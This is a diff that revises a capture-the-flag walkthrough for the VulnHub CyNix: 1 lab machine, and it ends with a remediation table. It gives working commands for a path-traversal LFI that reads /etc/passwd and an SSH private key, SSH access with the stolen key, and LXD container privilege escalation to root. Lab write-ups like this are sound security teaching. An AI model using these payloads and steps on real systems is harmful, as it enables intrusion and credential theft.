@@ -1,132 +1,126 @@
 # CyNix: 1 — Writeup
 
-| | |
-|-|-|
-| **Target IP** | 192.168.1.105 (host-only) |
-| **Difficulty** | Intermediate |
+| Field | Value |
+|---|---|
+| **Target IP** | 192.168.1.105 |
+| **Difficulty** | Medium |
 | **OS** | Linux |
-| **Flags** | user.txt + root flag |
-| **Source** | [VulnHub](https://www.vulnhub.com/entry/cynix-1,394/) |
+| **Goal** | Two flags: user.txt and root flag.txt |
+| **Source** | [HackingArticles](https://www.hackingarticles.in/cynix1-vulnhub-walkthrough/) |
 
 ## Attack Summary
 
-nmap → DirBuster `/lavalamp` → hidden form → LFI (`file=`) → `/etc/passwd` + SSH `id_rsa` → SSH as `ford` (lxd group) → LXD Alpine container with host mount → root
+CyNix: 1 combines a client-side CSS bypass, Local File Inclusion (LFI), SSH private key theft, and privilege escalation via LXD group membership. The web application hosts a hidden form whose visibility is controlled by an inline CSS `opacity: 0` attribute. Once exposed, the form's `file` parameter is vulnerable to path traversal, allowing an attacker to read `/etc/passwd` and extract SSH private keys. The compromised user belongs to the `lxd` group, which enables creation of a privileged container that mounts the host filesystem, granting full read access to `/root`.
 
 ## Methodology
 
-1. Network discovery
-2. Web enumeration — DirBuster on port 80
-3. Hidden form in `/lavalamp/canyoubypassme.php`
-4. LFI via `file=` parameter — read `/etc/passwd` and SSH key
-5. SSH as `ford` using extracted private key
-6. LXD privilege escalation via Alpine container
+1. Reconnaissance — Netdiscover + Nmap
+2. Directory brute-force — DirBuster
+3. Hidden form exposure — browser developer tools
+4. LFI exploitation — Burp Suite Repeater
+5. SSH private key exfiltration via LFI
+6. Initial access via SSH
+7. LXD privilege escalation
 
----
+## Step 1: Host Discovery and Port Scanning
 
-## Step 1: Network Discovery
-
-```bash
-sudo netdiscover -i eth1 -r 192.168.1.0/24
-```
-
-Then full port scan:
+Run Netdiscover to identify the target on the local network, then perform a full-port aggressive scan:
 
 ```bash
+netdiscover -r 192.168.1.0/24
 nmap -p- -A 192.168.1.105
 ```
 
-Key findings:
-- Port 80: HTTP (Apache default page)
-- Port 6688: SSH (non-standard port)
+Open ports:
+- `80/tcp` — Apache HTTP
+- `6688/tcp` — SSH
 
-![Nmap scan](images/01-nmap.png)
-
----
+![Nmap scan results](images/01-nmap.png)
 
 ## Step 2: Web Enumeration
 
-The default Apache page is shown on port 80. Run DirBuster:
+The web root shows only the default Apache page. Run DirBuster to brute-force directories:
 
 ```bash
-dirb http://192.168.1.105 /usr/share/wordlists/dirb/common.txt
+dirb http://192.168.1.105 /usr/share/dirb/wordlists/common.txt
 ```
 
-Discovered: `/lavalamp/` directory. Browsing to it shows a page with a contact form that POSTs to `/lavalamp/canyoubypassme.php`.
+DirBuster finds `/lavalamp`. Navigating to it reveals a contact form that POSTs to `canyoubypassme.php`. Visiting `/lavalamp/canyoubypassme.php` directly shows only an image, but the page source contains a hidden form with `style="opacity:0"`.
 
----
+![DirBuster discovers /lavalamp](images/02-dirbuster.png)
 
-## Step 3: Bypass Hidden Form
+## Step 3: Expose the Hidden Form
 
-The form is styled with `opacity: 0` to hide it. In browser DevTools change opacity to `1` or intercept with Burp Suite. The form sends a parameter `file=1`.
+Open browser developer tools (F12), locate the form element that has `opacity: 0`, and change the value to `1`. The form becomes visible. Submitting it sends a `file=1` POST parameter, which is captured in Burp Suite Proxy.
 
-Test for LFI by changing `file=` to a path traversal:
+Forward the request to Burp Repeater and test for Local File Inclusion:
 
 ```
-POST /lavalamp/canyoubypassme.php
+POST /lavalamp/canyoubypassme.php HTTP/1.1
+Host: 192.168.1.105
+
 file=../../../etc/passwd
 ```
 
----
+The response returns the contents of `/etc/passwd`, confirming path traversal LFI. Users `ford` and `lxd` are visible.
 
-## Step 4: LFI — Extract `/etc/passwd` and SSH Key
+![LFI confirms /etc/passwd read](images/03-lfi.png)
 
-Confirm LFI with `/etc/passwd`:
+## Step 4: Extract SSH Private Key via LFI
 
-```
-file=../../../etc/passwd
-```
-
-Users `ford` and `lxd` are visible.
-
-![LFI /etc/passwd](images/02-lfi-passwd.png)
-
-Extract SSH private key:
+With ford's home directory established, read the SSH private key:
 
 ```
 file=../../../home/ford/.ssh/id_rsa
 ```
 
-![id_rsa via LFI](images/03-lfi-id_rsa.png)
-
-Copy the key content to a file and set permissions:
+Copy the returned key content into a local file named `key`:
 
 ```bash
-vim ford_id_rsa   # paste the key
-chmod 600 ford_id_rsa
+nano key   # paste the key content
+chmod 600 key
 ```
 
----
+![SSH private key extracted via LFI](images/04-ssh-key.png)
 
-## Step 5: SSH Login as ford
+## Step 5: Initial Access via SSH
+
+Use the extracted key to log in as ford on the non-standard SSH port:
 
 ```bash
-ssh -i ford_id_rsa -p 6688 ford@192.168.1.105
+ssh -i key -p 6688 ford@192.168.1.105
 ```
+
+Read the first flag:
+
+```bash
+cat ~/user.txt
+```
+
+Confirm group membership:
 
 ```bash
 id
-# uid=1000(ford) gid=1000(ford) groups=1000(ford),108(lxd)
-cat user.txt
+# uid=1001(ford) gid=1001(ford) groups=1001(ford),116(lxd)
 ```
 
 The `lxd` group membership enables container-based privilege escalation.
 
-![SSH as ford — lxd group](images/04-ssh-ford.png)
-
----
-
 ## Step 6: LXD Privilege Escalation
 
-On the attacker machine, build an Alpine container image:
+### On the attacker machine
+
+Clone the Alpine builder and create a minimal LXD image:
 
 ```bash
 git clone https://github.com/saghul/lxd-alpine-builder.git
 cd lxd-alpine-builder
 sudo ./build-alpine
-python3 -m http.server 8000
+# produces: alpine-v3.10-x86_64-20191008_1227.tar.gz
+python -m SimpleHTTPServer 8000
 ```
 
-On the target machine:
+### On the target machine (as ford)
 
 ```bash
 cd /tmp
@@ -139,30 +133,30 @@ lxc start ignite
 lxc exec ignite /bin/sh
 ```
 
-Inside the container:
+### Inside the container
 
 ```bash
 id
 # uid=0(root) gid=0(root)
-cd /mnt/root/root
-cat flag.txt
+cat /mnt/root/root/flag.txt
 ```
 
-![Root flag](images/05-root.png)
+The host filesystem is mounted at `/mnt/root`, giving unrestricted read access to the root directory.
 
----
+![Root flag captured via privileged LXD container](images/05-root-flag.png)
 
 ## Lessons Learned
 
-1. **LFI via hidden form parameter** — opacity CSS hiding is client-side only; Burp Suite bypasses it trivially
-2. **SSH private key extraction via LFI** — if `~/.ssh/id_rsa` is readable, LFI leads directly to shell access
-3. **LXD group = root** — any user in the `lxd` group can mount the host filesystem inside a privileged container
+- Client-side controls (CSS opacity, hidden form fields) are never a security boundary. Any user can modify DOM properties via developer tools.
+- LFI vulnerabilities that can read arbitrary files on the system are critical when private key files are accessible to the web server process.
+- Membership in the `lxd` group is equivalent to root access on the host. Group assignments must be audited as carefully as sudo rules.
+- The SSH private key was stored in a location readable by the web server, violating the principle of least privilege.
 
 ## Remediation
 
 | Vulnerability | Fix |
 |---|---|
-| LFI in `file=` parameter | Whitelist allowed values; never pass user input to file-read functions |
-| Hidden form via CSS | Security must be enforced server-side, never client-side |
-| LXD group membership | Remove unprivileged users from the `lxd` group |
-| SSH key in home directory | Use key passphrase + restrict `~/.ssh/` to mode 700 |
+| Hidden form exposed via CSS | Move sensitive functionality behind server-side authentication, not CSS visibility |
+| LFI in `file` parameter | Validate and whitelist allowed file paths; never pass user input directly to filesystem functions |
+| SSH private key world-readable | Restrict key permissions to the owning user; keep keys outside the web root |
+| LXD group privilege escalation | Remove users from the `lxd` group unless strictly required; use AppArmor/seccomp profiles |
